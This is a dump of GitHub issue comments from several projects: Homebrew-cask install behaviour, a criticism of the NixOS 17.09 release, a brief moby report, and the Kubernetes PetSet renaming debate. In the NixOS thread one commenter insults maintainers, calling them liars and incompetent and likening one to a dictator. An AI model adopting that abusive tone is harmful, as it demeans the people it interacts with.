homebrew-cask/Homebrew/13201/142396400,"Trashing sounds fine. It's the same as what MacUpdate does. MacUpdate is a good model generally - it does not ever try to update system apps such as Mail.app, and any updated apps send the old version to the Trash. ",,False,False,13201
homebrew-cask/Homebrew/13201/142668819,Should we think about seeing if Homebrew Cask could use a command-line interface to run application auto-updaters for casks whose  stanza is set to true if such a CLI is provided by said auto-updater?  And should we ask more auto-updating applications to provide CLIs to their auto-updaters? ,,False,False,13201
homebrew-cask/Homebrew/13201/142672231,"No. Not anywhere in the near future, at least. ",,False,False,13201
homebrew-cask/Homebrew/13201/143013809,"@friend  Guess I'll put that on the wishlist, then — where is that, by the way, or would I just mention my feature request in 'Issue #13969  Add auto_updates stanza for Casks'? ",,False,False,13201
homebrew-cask/Homebrew/13201/143050459,"@friend There isn’t any. To be clear, what I mean by that is that it is out of the question for now. You can mention that again a few months after this installation behaviour is implemented and we actually see how it worked in the wild, but to be honest I don’t see that feature ever happening. For one, it’s two much work for little to no gain. We’d need to support each application individually and it’d be mostly useless if the application can auto update itself, let it, that is the whole point. Furthermore, asking developers to support CLI ways of updating their GUI apps is a losing proposition I bet it is not going to happen. Not in any meaningful number. ",,False,False,13201
homebrew-cask/Homebrew/13201/143476609,"@friend  Ah, I see.  Such a feature would be convenient, though…sigh. ",,False,False,13201
homebrew-cask/Homebrew/13201/144619454,"As someone who does expect in-app auto-update to work (and hasn't gone around disabling it), I'm really looking forward to this change. Over half a dozen apps installed via HBC exist not only in  as symlinks, but also in my  folder. Likely due to auto-updates deciding that's where they belong. It's a mess, and then there are bizarre errors like this &lt;img width=""663"" alt=""tower-linking"" src="" a user experience perspective, I think it's very important to arrange applications the way the regular installers do, making  and in-app upgrades interchangeable. In the following screenshot, a Lightrooom 6 upgrade left me with ""Lightroom 5"" (must confirm whether their installer renamed it, but I believe so). &lt;img width=""854"" alt=""lightroom5"" src="" for concerns of overwriting Mail.app, HBC couldn't do so if it tried, at least as of El Capitan. System Integrity Protection protects the Apple apps listed in . (Of course, not overwriting apps managed by the App Store could still be a valid concern). One final remark. Could we please update the README to use more precise wording (""in the future""). I misread it ""as of 12/Aug/2015, Homebrew-cask will..."" And then I was sad that it wasn't the case. ",,False,False,13201
homebrew-cask/Homebrew/13201/144620877,"I believe @friend was looking for some evidence of the issues this change will help resolve. Here's another one. I only have one copy of Things installed, but Things is confused because there is a symlink in  and the actual copy in . I don't want to know what happens if I click Delete  ""Extra"" Copy. &lt;img width=""504"" alt=""things"" src=""",,False,False,13201
homebrew-cask/Homebrew/13201/145466358,So when will this change happen? ,,False,False,13201
homebrew-cask/Homebrew/13201/145511627,"When it’s done. There’s really no other answer, there. ",,False,False,13201
homebrew-cask/Homebrew/13201/145890070,"I'm happy to see this change is finally happening, I've been using cask for a long time but the application management has always bothered me. Good work on this proposal/documentation of how it's going to be implemented, exactly what I've been hoping for! plus one ",,False,False,13201
homebrew-cask/Homebrew/13201/145981721,I'm interested in how this is going to work in a situation where a user has already installed an app from the Mac App Store. Will an overwrite prompt be given? ,,False,False,13201
homebrew-cask/Homebrew/13201/145983612,"@friend I believe that was addressed in the previous comments. Since the app was not installed beforehand, and the file exists, a warning/error will be given and no overwriting will take place. ",,False,False,13201
homebrew-cask/Homebrew/13201/145985528,"Actually, I just tested out Skitch. There was no prompt at all. Brewfile using ",,False,False,13201
homebrew-cask/Homebrew/13201/145989429,Was able to reproduce with several App Store/free apps. Evernote Alfred etc. ,,False,False,13201
homebrew-cask/Homebrew/13201/145989776,"@friend There is no prompt. This is what happens if you already have an app installed No failure is reported because nothing failed. The cask was downloaded, unpacked, and staged. We won't remove an existing non-cask installation. ",,False,False,13201
homebrew-cask/Homebrew/13201/145990120,"I'm telling you it's happening on my system. Clean install of El Capitan. I'm running , btw. Maybe that's the difference. ",,False,False,13201
homebrew-cask/Homebrew/13201/145990870,"is an external plugin, and not officially supported by . I can't speak for what it does or doesn't do. Have you double-checked your  to make sure that it is, indeed, a symlink to the Cask installation? If not, then everything is working as intended. ",,False,False,13201
homebrew-cask/Homebrew/13201/145991326,"In any case, what you are reporting would be a bug with the existing behavior of . If you determine that we are, in fact, overwriting app bundles with symlinks, please open a separate issue. ",,False,False,13201
homebrew-cask/Homebrew/13201/145991671,"@friend Help my understand why  is an external plugin, if it's maintained by the  org on GitHub.  cc @friend In any event, what's the recommended way to batch install multiple casks? ",,False,False,13201
homebrew-cask/Homebrew/13201/145992461,@friend See  for issues with homebrew-bundle ,,False,False,13201
homebrew-cask/Homebrew/13201/145994694,"@friend We are not Homebrew. Homebrew and Homebrew-cask are maintained by completely separate teams. Therefore,  is external to us. If you want to install multiple casks, a simple shell script would suffice Or perhaps Or even ",,False,False,13201
homebrew-cask/Homebrew/13201/146083458,Why is it that after I  that my GitHub Desktop.app shows in my  folder as a symlinked app but shows in launchpad as an app that isn't symlinked? ,,False,False,13201
homebrew-cask/Homebrew/13201/146098222,@friend Oh launchpad don't mind whether it is a symlink or a directory. ,,False,False,13201
homebrew-cask/Homebrew/13201/146100219,Then can I take that directory from launchpad and apply that to my  folder? ,,False,False,13201
homebrew-cask/Homebrew/13201/146143424,"@friend Your problem has nothing to do with this issue. Lets please stay on-topic, it is big enough as it is. Either way, it’ll be irrelevant once this is up, so we won’t work on it. Furthermore, your last post is an OS X question, not a homebrew-cask question, so you should resort to a website with that specialty, like Ask Different from Stack Exchange. ",,False,False,13201
homebrew-cask/Homebrew/13201/146145297,"@friend I recommend you post one more comment that sort of acts as an FAQ and then lock this thread. I think the FAQ should include answers to the following questions (my best-guess answers are in parens)  What is this thread about? (HBC will be changing the way it works, and this is an announcement) Are these changes in effect yet? (No) When will these changes be in effect? (Not sure, but not now) Is there a timeline for that? (No) Why not? (Because this project is run by volunteers) How can people help out? (By contributing code) What if someone has a question regarding this issue? (1. Check that it's actually related to this issue 2. Check that the answer isn't in this thread 3. If neither, open a new issue)  ",,False,False,13201
homebrew-cask/Homebrew/13201/146187043,"@friend I like that, thank you. Nothing further to add to your FAQ, so we can leave it as is. I didn’t want to close this at the start because I wanted people to find holes in it, but it seems like the idea as it stands is pretty solid and agreed upon, so yes, lets stop diverging further since comments have been becoming less relevant. ",,False,False,13201
homebrew-cask/Homebrew/13201/220445423,"The first and most important part of this change is now very close to being implemented. If you’re interested in helping test it, head over to  and follow the instructions at the bottom. ",,False,False,13201
homebrew-cask/Homebrew/13201/222757478,"Getting really close, now, so if you had some things you wanted to do that are dependent on this change, now is the time. ",,False,False,13201
homebrew-cask/Homebrew/13201/222794835,"And merged. There are still a few things that need to be done in order to close this issue, but the biggest user-facing change is now present. ",,False,False,13201
homebrew-cask/Homebrew/13201/252245843,"@friend, what exactly still needs to happen for this to be closed? The only thing I'm seeing that is not yet implemented is  and , which kind of contradict themselves. Why would you be able to override a required location? That would mean the location isn't actually required. ",,False,False,13201
homebrew-cask/Homebrew/13201/252247982,"@friend  is also yet to be implemented. As for , I do not remember my reasoning there, and I guess it could be stricken (not , though, naturally). ",,False,False,13201
homebrew-cask/Homebrew/13201/252259742,"I suggested  in  mostly because I think the user should have final say in where their stuff is installed, and may have good reason for overriding the developer's stated location requirements. We should absolutely print a warning when the user overrides  though, so they have no grounds to blame us for a broken installation. ",,False,False,13201
homebrew-cask/Homebrew/13201/464096761,"@friend, I think we can close this in favour of ",,False,False,13201
homebrew-cask/Homebrew/13201/464110068,@friend Agreed. At this point other issues should take care of whatever is missing here. ,,False,False,13201
nixpkgs/NixOS/31045/270040404,"At NixCon 2017 it appeared as if the release managers thought their release went well. Via this message I would like to provide some data to the contrary. I tried to upgrade on two different machines to 17.09 and none of them worked without reconfiguration or without removing features. As such I am still stuck at 17.03 on both and haven't bothered upgrading other machines. For example  Skype doesn't work anymore (broken download) Flash failed (has been fixed, but by the time 10 people have discovered it, you already failed) NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  It is great that doing a rollback was possible (although it does restart the network connection, which would result in some downtime on production infrastructure), but as far as I am concerned no working 17.09 release with feature parity from 17.03 has been released. I am also not happy with the discontinued support of 32 bits code when other distributions still support newer 32 bits code. Not sure whether this is specific to 17.09. There are just a small number of critical packages that tens of millions of people use of which Skype and Flash are an example. NFS is used by a lot of businesses and as such should also be considered important. I don't understand how one can make a release without systematically creating tests based on e.g. Debian's popcon download measures to see whether a package still works. If a release has any QA done on it, I have missed it. What is the point of tagging some git version as a release when the QA on it is non-existent? ",,False,False,31045
nixpkgs/NixOS/31045/340897127,Flash and Skype in Debian's popcon? -)  I must say our QA for unfree packages is inherently worse just because of the policy not to allow building such packages on the build farm. ,,False,False,31045
nixpkgs/NixOS/31045/340901577,"To remain positive, QA done specifically for the release   A critical test-set is checked before every channel bump, too, though it would certainly be nice to have more tests.  You may have noticed a couple proposals around tests on NixCon 2017. ",,False,False,31045
nixpkgs/NixOS/31045/341240038,"Hi there! Yes, indeed, we are quite proud of our release. We merged thousands of pull requests, addressed many many issues, added lots of services and packages, and included many security updates. Our community has also grown quite a lot, and we are proud and excited by the growth and progress of NixOS. You've had a less good experience, and that sucks. It seems you fall in to somewhat less tested areas of NixOS, and that is certain to expose you to sharper corners and more broken things. I'm sorry you  did! Please try upgrading your remaining machines, as 17.03 is no longer supported. We'd rather dedicate everyone's efforts to making 17.09 work sufficiently well. It seems that two of your issues are with unfree software, which NixOS doesn't officially test in any capacity. This is by policy, so any sort of testing on these packages will have to be by volunteer contributors on their own time and hardware. If you'd like to help with this, I'd be happy to work with you to help set something up. Your third issue about NFS NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  Luckily, it seems one of our volunteer contributors has a patch! Maybe you could try it out on your system, and reply to the PR  I don't see an issue about this. Can you open one? When I call , I don't have this issue ... Hmm... Unfortunately NixOS is a small distribution without substantial corporate backing. We still support and build some software for i686, but as you say, we no longer support entire i686 systems. It was a very difficult choice, as we didn't want to leave users without updates, but we believe it was worth the decision. x86_64 has been available for 17 years now and covers almost all of the modern hardware. Dropping i686 support has significantly improved our ability to test and release NixOS. What were you using i686 for? Regarding NFS We have automatic testing of NFS 3 and NFS 4, which pass   tests automatically create servers and clients and run thorough tests to ensure our NFS support works. I think that is pretty good, and pretty cool! However, it doesn't cover the autofs case. Perhaps we should add that to the test? Would you like to send a PR adding it? If so, I'd be happy to do an IRC chat or video call to help you. Maybe you're not familiar with the extensive, innovative automatic VM testing we already do? I think it is pretty cool, and many distros don't have as robust of a test framework we do. Please remember that NixOS is operated by a very wonderful group of volunteers, and your negativity isn't welcome. If you would like to learn about our release proceses, we'd be happy to show and teach you. If you would like to learn about our QA process, we'd be happy to show and teach you. If you would like to become a contributor and help scratch your own itches, make NixOS as good as it can be for your use cases, we'd be happy to show and teach you. If you would like to contribute enough money to hire a team of full time people to work on and support NixOS, we'd be happy to work with you. Thank you, Graham Christensen ",,False,False,31045
nixpkgs/NixOS/31045/341245378,"I'm pretty sure I cannot add much to @friend's awesome response, except to say we're sorry that you had issues and want to emphasize that we try to deliver the best experience possible but sadly don't have infinite resources and even by far not as many as debian etc. ",,False,False,31045
nixpkgs/NixOS/31045/341250958,Updated the nixpkgs manual and the wiki that we cannot test or build unfree packages. ,,False,False,31045
nixpkgs/NixOS/31045/343246015,"@friend I upgraded one server to 17.09. Another system upgrade broke idempotency. That is, . It is my understanding that the NixOS organization claims to achieve the opposite. The i686 device is an end user laptop. If it runs a browser (don't care which one as long as it is graphical) and an ssh client. Regarding your tests, I took a look at one of your links and found a build with a green checkmark which said (  ) to me that says that the QA on the tests themselves is lacking. One of the prerequisites for testing an application is a working system. That is already not working here, so at that point I stopped reading output. While everyone hearts your reaction, this self congratulatory attitude seems overly positive. Perhaps I have different metrics regarding success, though. For example, you count thousands of PRs being merged as an achievement. I count the work of e.g. Ericson2314 as one feature of interest (if it works) despite it being spread out over many PRs. As a leadership principle, undesired behavior should not be encouraged. By celebrating a meaningless metric like the number of merged updates, you only achieve tired contributors (because pressing a merge button cannot possibly be more boring), who at some point will be bored and stop. When people dig a tunnel with a teaspoon you are the one cheering to the team, while I am there thinking why don't they call 3M? Your message about my ""negativity not being welcome"" seems to be straight from SJW hell. While Nix and NixOS do some things pretty good, there is also a lot of stuff which is terrible. Implying you only want ""happy thoughts"" essentially is not leadership, it's a culture suited for the gulags. When someone throws shit in your face, are you also going to describe it as a warm welcome gift? I am not sure whether this is an American thing, but I can assure you that it is not normal to take criticism this badly. In short, your message is more passive aggressive than it should receive a heart. In the future stick to the facts please. The facts are that 17.09 was not ready for use, even today. @friend You are allowed to test and build unfree packages in a lot of cases. Redistributing the resulting builds just is not always allowed. But distributing the recipe for building something and claiming you have followed that recipe and ended up with something that works is perfectly fine. There are a few database vendors which say that you cannot publish benchmarks, but simply saying that you cannot do it, is just lying. Perhaps you don't want to do it or you have no interest in it. Perhaps there is nobody in the entire community interested in it. That still doesn't mean that it cannot be done. So, building a piece of software and then not distributing it to entities who are not a member of the NixOS organisation is perfectly legal. This particular contribution to the manual is of negative value, because it doesn't reference any policy and provides no legal reason. As such, you have just inflated the size of the manual prematurely and someone else (me in this case) needs to point out the fact that you need to redo it again. ",,False,False,31045
nixpkgs/NixOS/31045/343262736,"Upgrade broke idempotency Could you please elaborate what broke for you? Did you open an issue for that? Claiming something broke without mentioning what or any further explanation is not polite. Why? What are the issues that should be fixed in your opinion? You can't expect everything to be bug-free, even with extensive testing in place. Just look at other community-driven distributions for a reference. Errors happen, may they be in the code or in its tests. nfs4 NixOS Test This could be a bug in the test that nobody noticed before. We should fix that but that doesn't mean that all NixOS tests and their QA are inherently inadequate. Even though the kernel printed a stack trace the VM seemed to work fine. I can't pinpoint an actual cause for the stack trace after a quick look. Unfree packages Our CI system is not able to build packages without pushing it to the binary cache at cache.nixos.org. This would require some code changes. You're free to implement this. As nobody has done this yet or opened an issue that I know of there doesn't seem to be much interest in it. I don't agree that the manual change is useless and that I am lying. It just clarifies that we can't support unfree software unless we look at each license/EULA on a case-by-case basis (""most""). This is the legal reason. If you have a suggestion to improve the wording, please do send it to me or open a PR. You're also welcome to help to add license abstractions for unfree software that we can build, distribute or run. We're just putting everything in the unfree category so we don't have to deal with that. Personally, I'm not interested in improving the unfree packages situation in my spare time and any help is appreciated. ",,False,False,31045
nixpkgs/NixOS/31045/343264647,"Unfree packages I don't see it as being that much about legal reasons but about current policy for the build farm &ndash; it disallows building ""unfree"" packages and now it's explicitly written down in docs.  Note that many distributions don't even allow them into the main repository.  I'm personally not too motivated by them, but if enough people are interested, surely they can put together a Hydra instance doing the additional unfree tests (and write them first, actually ). Negativity I'm personally not at all against criticizing etc. but it seems only useful if it's done in a ""productive way"", i.e. focused on fixing those problems.  For example, you claimed that idempotency got broken but you provided almost no information about it (so far). ",,False,False,31045
nixpkgs/NixOS/31045/343749156,"@friend It's not that I don't want to provide information. The available logging information was limited. I got a ""Warning"" that a service didn't restart correctly, but running  directly afterwards did succeed. I looked into  and  and didn't see the details that were needed for a quick resolution. I wouldn't mind running a Hydra instance for a limited number of packages, but not as long as I can't just copy paste something complete in my configuration.nix. @friend The font issue mentioned is the most user visible problem and that's 100% open-source code. If there is an intention to make things better, one could setup a canary machine that compares pixels for various terminal emulators as well as e-mail programs for different versions for rendering 'the quick brown box...'. The reason this would be a reasonable approach is that desirable font changes for a given machine for the same configuration are extremely rare, while searching for ""broken fonts"" on a search engine returns many results. It is a recurring problem resulting from a lack of QA processes. Implementing something like this could be done on various levels, but starting a terminal emulator, waiting for the window to exist with e.g. wmctr, making an automated screenshot (with scrot) and comparing the image to the reference image for equality seems to be in the realm of the possible (that could be a call to diff). Once that is in place, the same tests could be run on virtual graphics devices and shipped to end users even. End users could select that they want to opt in to the test program, where differences would result in an automatic rollback. That way they don't even need to report that their NVIDIA GTX1070 with sprinkles has a problem. Instead, they would just upgrade the next week, possibly automatically, and they would have never seen there was a problem in the first place. I agree that it would be better if Microsoft would maintain a Nix expression for Skype, but since they don't do that... If there was an open-source alternative for Skype, I wouldn't mind to share those with my contacts, but the last time I tried to use one, it didn't end well. Regarding the legal issue You should first establish that there is even a single EULA on this planet which says that you are not allowed to talk about the mere fact that a particular Nix expression accomplishes something when installed on your infrastructure. You can write a whole book about doing highly illegal things. In fact, in the case of Nix it's a mathematical theorem Given a complex state machine (a computer), and then executing a particular program will result in a particular bit being set to 1. There is no way that's illegal. A less contrived argument is that it falls under interoperability laws and you are perfectly allowed to reverse-engineer even Oracle software for such work. I am fairly sure that Oracle would be happy to see its software work on NixOS out of the box with an integrated payment system so they can more easily take your money. It's just that NixOS is so incredibly insignificant right now that merely looking at this website won't have a positive ROI for them. Doing much more than this, like running actual benchmarks and publishing those is against the EULAs of some companies, but that's a completely separate topic. So, my point stands. Legally, your arguments are not sound. If you don't want to do work for free, that's an understandable position, but don't make up legal arguments based on nothing. Just because something is community driven, doesn't mean quality has to suffer. Comparing yourself to other distributions doesn't lead to a significantly better system. The reason NixOS exists, is because all the other distributions were designed badly. The other systems cannot and will never work. ",,False,False,31045
nixpkgs/NixOS/31045/343752916,"I don't think that will work reliably without repeated maintenance.  There isn't one way to render fonts, and freetype+fontconfig do change the (default) rendering a bit, from time to time.  Still, if someone was manually checking it whenever it changed and somehow was building up a database of acceptable renderings... it might work well and it would be better QA, yes.  (It's not high on my own priority list, but why not have them.) BTW, we do have some VM tests with OCR, screenshotting, etc.  The VM tests aren't very resource-efficient, and some are planned to be migrated to containers, but everyone is welcome to write more tests.  I'm certain we can accommodate reasonable ones on Hydra (for ""free"" SW at least). ",,False,False,31045
nixpkgs/NixOS/31045/344222060,"This discussion is not leading to anything productive. Therefore I'm closing this issue. The other comment was edited to include the ""incompetence"" of someone responsible for the release. This language is not acceptable. You're just discrediting the hard work of our community without having contributed anything yourself. Please help instead of insulting people who want to help you. hankey I do not understand your arguments about the legal issue and will not waste any time discussing this with you. Please open a PR with alternative wording or shut up about this. ",,False,False,31045
nixpkgs/NixOS/31045/345473582,"@friend You are lying again, since it has actually led to something productive in the referenced issues. As such you are essentially discrediting me, while in fact I did make a useful contribution, albeit not in code, but with a comment to the upstream author of the package causing the issue. Clearly, that has been useful. If you lack the mental capabilities to understand a legal argument, you should delegate decisions to others who do. Criticism is discrediting ""the hard work"" and can optionally include mentioning things that went well, which is exactly what I did. The fact that you haven't learned the concept of criticism as a grown man must make your life difficult. You are the one wasting the time of the community with your lies and the fact that the released software broke basic features. If you can't be bothered to run a couple of terminal emulators in all the popular environments (there are about 4 or so), why call yourself ""responsible"" for the release? If you want to receive credit for a quality release, make a quality release and you will be credited in history with this fact. The flip side is that when you don't, you get the blame and effectively negative credits. If the person responsible for this isn't incompetent, then the person responsible is not willing to make it work, which would be even worse. If you are going for the ""we don't have the resources angle"", then don't make a release at all. Closing an issue for accurately describing a release, because you disagree and you can is nothing short of what Bashar al-Assad would do. With your policy, you should just add an EULA to NixOS stating that one cannot write a review or publish a bug report about NixOS. Perhaps ask Oracle's legal team for advice on such matters. I sincerely hope that you will learn to take criticism in the future. In a corporation, this issue would be reopened, until all the dependent issues have been solved. Since no such reference has been made, I believe this is not the case. As such the only rational course of action is to reopen this issue. I will close it when the referenced issues have all been resolved. If I can upgrade to 18.03 in some months without issues I will press the thumbs up button to credit the merit of whoever is responsible for the 18.03 release if someone else makes a review of the 18.03 release. In short, please stop pissing me off, especially since I am very limited in the amount of time I can spend here. A community doesn't grow when you piss people off. ",,False,False,31045
nixpkgs/NixOS/31045/345513710,"As noted, this isn't an appropriate way to engage with the NixOS community. I invite you to not participate in communities you think are full of liars and incompetent people. Maybe a different distribution has more competent members that will leave you satisfied. ",,False,False,31045
nixpkgs/NixOS/31045/345517096,"I wanted to write a response how we treat people regardless how much they contribute to NixOS community, but I feel we've gone through this so many times that I just blocked @friend You're still welcome to use our free software, but you're not welcome by contributing harsh words. ",,False,False,31045
moby/moby/6604/36255511,This is likely more informational and nothing actionable now.  It looks like a flag changed and it made it so my container could not start the container (nor did it start upon upgrading) Removing the container and restarting it fixes it; just seems ( ,,False,False,6604
kubernetes/kubernetes/27430/160405221,"I brought this up back when PetSet was just a proposal, but it didn't get much response. At the risk of being labeled or dismissed as an ""SJW"" or ""preachy vegan,"" or of stirring up drama, please hear me out The name PetSet is derived from the common metaphor in infrastructure of ""pets vs. cattle."" The metaphor encourages infrastructure developers to think of cloud servers as anonymous and fungible resources rather than things to be manually managed by a person. The implication is that instead of treating a server like a pet, which you take care of and treat when it becomes sick, you simply destroy the server and replace it with a new one, as a cattle rancher would simply kill an animal that didn't serve its economic purpose to the rancher. The pet has a personal and emotional value to you, but the cattle is just a commodity. The lesson in infrastructure here is quite a good one, and its value should be preserved, but using this particular metaphor is quite unfortunate, because it perpetuates the unfortunately common belief that the life and well being of a non-human living thing has value only in relation to its value to humans. This may seem like making a mountain out of a molehill, but try to think about how our language perpetuates our culture and our beliefs. Try to think about it in the context of how future generations will see it. In the same way that homophobic or racist language was (and in some cases still is) commonplace and accepted in days past, in the modern world we generally recognize this language as unacceptable because it promotes a negative world view that we have progressed past. Imagine how angry people would be if this feature were called ""WifeSet"" and the analogy were ""wives vs. bar hook-ups.""  We're in an era of increasing empathy, and that empathy is not bounded only to other humans. It affects any being that can feel pain, sadness, or loss, like we can. While I don't claim to have a perfect substitute for this analogy that might replace PetSet, the one I have been using myself is to compare the role of owning a car vs using a taxi or ridesharing service. When you own a car, it is your personal possession. You take care of it. You keep it fueled, cleaned, and maintained in good shape. When it breaks, you get it fixed. In contrast, a taxi or ridesharing service is using a car as a fungible resource. You hail one only when you need the service it provides, and you use it only as long as you require that service. You don't care which car picks you up, or who is driving it, as long as it is fulfills the service. So my own suggestion for a replacement for PetSet is CarSet. If someone has a better idea that seems to ""click"" with people more, all the better. And of course, the feature could be named something more general—it doesn't have to use an analogy. (I recall that originally ""NominalSet"" was being considered.) This issue is not about me or anyone else being ""offended,"" or requesting that the name be changed to CarSet specifically—it's just asking specifically not to invoke the pets vs. cattle metaphor in the name of this feature. Thank you very much for considering this. For context, here is my previous comment from back in the proposal phase. ",,False,False,27430
kubernetes/kubernetes/27430/226180901,Thanks for speaking up - we will definitely take this into the discussions in the community before this feature moves out of alpha. ,,False,False,27430
kubernetes/kubernetes/27430/226366676,"Agree.  We went with PetSet as a working name in part because we knew it could never be the ""real"" name, but we didn't have a good name for the concept yet.  Names hold power, so we want to be careful to find something thta captures the problem well.  Having a first impl of the solution will help refine the problem statement, too. ",,False,False,27430
kubernetes/kubernetes/27430/231476253,@friend I kinda like it ... and it may be a bit too late.  Lots of press about Pet Set already. ,,False,False,27430
kubernetes/kubernetes/27430/231479424,"Yeah, I may have misunderstood what was meant by changing it before coming out of alpha. To some extent I think the damage is already done now. ",,False,False,27430
kubernetes/kubernetes/27430/231482659,Blame me 👍   One good thing ... memorable names stick.  Can we close this? ,,False,False,27430
kubernetes/kubernetes/27430/231488356,I'd still like the team to consider changing it. ,,False,False,27430
kubernetes/kubernetes/27430/231488776,"I think we really should consider changing it.  Silly names do stick, but they are silly. On Fri, Jul 8, 2016 at 332 PM, Jimmy Cuadra notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/231491609,"@friend we have videos on YouTube, blog posts, tweet, LinkedIn stuff and presentations at conferences, and many many decks with that content. You want to do the rebranding???  It is a big problem to change at this point... ",,False,False,27430
kubernetes/kubernetes/27430/231492032,"Let's just leave it on the table.  I suspect neither of us have marketing degrees ) On Fri, Jul 8, 2016 at 355 PM, Chris Love notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/231495228,"I'm 100% ok with renaming, and don't feel like there's any pain in doing so. However, CarSet does not feel like a fit. For any who would like name change, please voice here. We'll bring this up at the community meeting next week, and I'd like to settle on a new name by August 1. ",,False,False,27430
kubernetes/kubernetes/27430/231495247,"Re-quoting myself for emphasis If the name were something that was seen more universally as unacceptable, I don't think ""people already started using the term in social media, oh well, let's keep it"" would be an acceptable attitude. The fact that it's already out there doesn't mean there's no value in changing it. If having a reference to something out in the wild meant you couldn't change it in the future, we wouldn't have things like changelogs and semantic versioning. ",,False,False,27430
kubernetes/kubernetes/27430/231496684,"CarSet does not have any relevance in tech, can we come up with something techy or ship like? I am sorta on the side of not changing it, but we need a good name.  If we do change it we gotta change it quite quickly. People will have PetSet in production very quickly if not now.  Changing code because a team chooses to change branding probably will not make people happy. ",,False,False,27430
kubernetes/kubernetes/27430/231497336,"Let's be sure to separate this out into two discussions - deciding on a change, vs the naming process.  We already have a pattern to deal with the later, but getting the general agreement in the community that the name should be changed probably is what we want to stay focused on for now. On Fri, Jul 8, 2016 at 734 PM, Chris Love notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/231502807,"@friend I'm not bound to CarSet (though PetSet doesn't have any ""relevance in tech"" either)—I was just offering a suggestion that used a similar metaphor, so as not to simply ask the team to do something without offering a possible way to do it. People who have worked on the feature or been involved in its design discussions will probably have better ideas, since they have the best understanding of the use cases for the feature. ",,False,False,27430
kubernetes/kubernetes/27430/231509945,"Just stumbled on this thread...adding my $0.02.  Naming IS HARD!!! I've named dozens of products, features and even companies and its never been a quick or simple process. Everyone has an opinion. 100% certain there will be someone that does't like a name. Getting everyone to agree on a name shouldn't be a requirement Very hard to re-name something once it has any kind of name recognition.   As for PetSets in particular, I think it's a pretty good name. Both informative and evocative (IMO in a good way), which are two of the most important aspects of a name. That said, its really the name of one of several similar kind of features. And within this broader context it lacks the consistency you'd expect across similar things. Don't have any of the history, but I thought Replication Controllers were renamed to Replica Sets to introduce the idea of Sets which could then be applied to different kinds of sets (i.e. PetSets). But as a group, these two names seem random and they miss the opportunity to apply further consistency across Sets (i.e. one name is literal, the other analogous). Also, will there be other kinds of Sets? If not, then random is probably OK. But if there will be more kinds of Sets, then the next one would also have to be random since you definitely shouldn't have two 'literal' names with another that is 'analogous'. That would just make PetSets seem too casual and not serious. ",,False,False,27430
kubernetes/kubernetes/27430/231513955,"FamilialSet would get the same idea across.  Each member of a family is special, cares about its peers, and often has a particular role, and everyone mourns the loss of any one member. Or something similar like KinSet or KindredSet On Friday, July 8, 2016, chrismarino notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/231515971,"JetSet seems fitting (and one letter off). Besides relating the term ""jet set"", a JetSet is composed of Jets, which should be handled with care ",,False,False,27430
kubernetes/kubernetes/27430/231518195,"The name petset is derived from the fact that I care about my pets, regardless of what anyone else thinks about their cattle. Cattle are sacred in some places, food in others, and I view that as a culture difference.  I won't use pets vs cattle to explain this feature where I'm from, but pets vs servers works just as well ) ",,False,False,27430
kubernetes/kubernetes/27430/231519362,@friend That's a fair point. Pets have value whether or not they are compared to something else. But the usage of the term in Kubernetes is not without context Pets vs cattle is a metaphor very commonly used in writing about modern infrastructure. A quick Google search even brings up usage of the term in Kubernetes's own blog. It seems to sidestep the issue I'm trying to address to suggest that the term has no prior meaning in this area of our industry. There are an infinite number of things this feature could be called. Surely there is something that would work that doesn't use this metaphor. ,,False,False,27430
kubernetes/kubernetes/27430/231528316,"We can publish options for discussion here. Instead of using metaphors, which can have unintended meaning, let's try a descriptive name. Should ideally be easy to understand for someone with a Linux background. Throwing out some options.  PersistentSet StatefulSet or StateSet PermanentSet StickySet BindSet NamedSet SavedSet StoredSet SequentialSet OrderedSet  ",,False,False,27430
kubernetes/kubernetes/27430/231541843,"I think that's a good initial set of names (pun intended). I don't think we're too late to change it, as others have pointed out. Yes, there are videos and other materials out there, but it will only get worse with time. If the community agrees that this is a worthwhile thing to do, it should act quickly, otherwise we end up with fuzzy transitions like the one from Replication Controllers to Deployments and Replica Sets. If we can come up with and agree on API method and parameter names we can certainly converge on object names like these. I find several of the ones proposed by @friend to be simple and self-explanatory. I personally think the first two work well PersistentSet or StatefulSet, as opposed to EphemeralSet. ",,False,False,27430
kubernetes/kubernetes/27430/231545530,"My $0.02 vote from Aparna's excellent list  NamedSet PersistentSet  On the crazy idea side  Snowflake Set Borg Set (like ""I am 7 of 9"")  I was never fond of PetSet - only for the reason that it is not obvious what it is on its face, and breaks with the obvious naming we have across the product. A ""ReplicaSet"" is, plainly, a set of replicas. A ""Deployment"" is ... well ... a deployment. Etc. The word I'm looking for here is ""what is the opposite of a bunch of exact replicas, each of which are unique in some way, but still have some similarity as a group."" Maybe I'm coming around to Family/FamilialSet. Or ClusterSet? ",,False,False,27430
kubernetes/kubernetes/27430/231553485,"Aparna's list is great. My favorite of the bunch is StatefulSet, since the term ""stateful application"" is used in the container world and should be pretty easily understood. In discussion of container orchestration systems, you'll often hear people ask, ""Great, but how does it handle stateful apps?"" In a similar way to how the other ThingSets are sets of Things, a StatefulSet is a set of stateful pods/apps. It could even be more explicit StatefulPodSet. ",,False,False,27430
kubernetes/kubernetes/27430/231554652,"FamilySet probably fails the ""is a recognizable term for describing the concept at play"", and is also redundant (a family is another way of saying ""set of humans with shared responsibilities for raising biological offspring"", so ""a set set""). The distinguishing characteristics of the use case for this object is  To preserve individual identity for fungible entities To provide predictable ordering and control as those entities change To enable the software entities to identify and recognize the other entities by those identities To get access to a consistent storage mechanism (because their identity also corresponds to data)  Sequence and ordering are relevant, but not strictly necessary (in the future we will probably introduce other naming and ordering schemes, which may prevent sequential / ordered from being accurate).  State (or at least, storage) is not required, although I agree that in practice most of the use of this set would be for stateful services. On Sat, Jul 9, 2016 at 413 PM, Jimmy Cuadra notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/231560045,"It's hard to pick a name that doesn't extol any single feature of petset (such as state, persistence, ordering, ordinality, name, sequence). This is one feature we built in reverse, by prototyping a bunch of applications that didn't fit in any existing bucket and formalizing their requirements into an api. This process is sometimes called domain modelling, and the number of things required by this domain is &gt; 1 word. We faced a similar dilemma choosing its api-group. I think ""is a recognizable term for describing the concept at play"" might be a trap, and we just need to call it a word that makes people think of the domain. ",,False,False,27430
